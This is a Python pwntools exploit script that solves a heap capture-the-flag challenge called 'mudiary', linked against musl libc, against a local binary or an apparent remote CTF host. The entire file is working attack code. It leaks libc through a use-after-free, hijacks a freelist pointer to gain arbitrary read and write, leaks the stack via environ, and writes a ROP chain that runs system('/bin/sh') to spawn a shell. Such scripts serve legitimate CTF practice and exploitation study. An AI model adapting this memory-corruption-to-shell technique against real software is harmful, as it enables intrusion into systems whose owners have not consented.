from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./mudiary"
args = []
io: process = None

speed = 0.1

def debug():
    gdb.attach(io, gdbscript=
    """
    define heaps
    p (char*[16])chunks
    end
    define mal
    x/16xg &mal
    end
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="demo-challenge.chals.io", port=443, ssl=True, sni="nopsctf-1318313e74e1-mudiary-1.chals.io") # replace sni

def launch_local():
    global file, io
    pty = process.PTY
    io = process([file, *args], stdin=pty, stdout=pty)
    debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    # l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1: b_ = 0
    return d[a_+len(a):b_]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./musl.so")

def exploit():
    def alloc(size, content=b""):
        sla(b"Enter Menu: ", b"1")
        sla(b"Size: ", str(size).encode())
        sla(b"Content: ", content)
    def edit(index, size, content):
        sla(b"Enter Menu: ", b"2")
        sla(b"index: ", str(index).encode())
        sla(b"Size: ", str(size).encode())
        sla(b"Content: ", content)
    def show(index):
        sla(b"Enter Menu: ", b"3")
        sla(b"index:", str(index).encode())
        leak = recvu(b"1) Add")
        return getb(leak, b"------------------\n", b"\n------------------")
    def free(index):
        sla(b"Enter Menu: ", b"4")
        sla(b"index:\n", str(index).encode())
    def exit():
        sla(b"Enter Menu: ", b"1337")

    alloc(0x18)
    alloc(0x18)
    alloc(0x18) # guard to avoid merging
    alloc(0x18) # guard to avoid merging (second heap)
    free(0)
    free(1)
    libc.address = u64(show(1)) - 0x9eb48 + 0x30
    info("libc: %#018x" % libc.address)
    print("%#018x" % u64(show(0)))
    # on remote, binary is next to libc so libc leak = pie leak
    # exe.address = libc.address - 0x5000
    exe.address = 0x0000555555554000
    info("exe: %#018x" % exe.address)

    chunks = exe.address + 0x40c0
    sizes = chunks - 0x10*8

    input("a")

    edit(0, 0x10, p64(chunks) + p64(chunks)) # hijack forward ptr -> points to the chunk storage of the binary (unlink exploit) -> AAR & AAW

    input("a")
    alloc(0x18)
    input("a")
    
    def read_str(address):
        payload = flat([
            address,
            address,
        ])
        edit(3, 16, payload)
        return show(0)
    def write(address, data):
        payload = flat([
            address,
            address,
        ])
        edit(3, 16, payload)
        edit(0, max(len(data), 16), data)

    environ = u64(read_str(libc.sym["environ"])) # leak stack
    info("environ: %#18x" % environ)

    pop_rdi = libc.address + 0x14c86
    payload = flat([
        pop_rdi,
        next(libc.search(b"/bin/sh\0")),
        libc.sym["system"] + 2,
    ])
    write(sizes, p64(0x18) + p64(len(payload))) # hijack size storage
    write(environ - 0x78, payload)

    # for i in range(0, 0x140, 8):
    #     print(i, "%#018x" % u64(read_str(environ - 0x140 + i)))

    io.interactive()
    input("end")
    exit()

launch()
exploit()
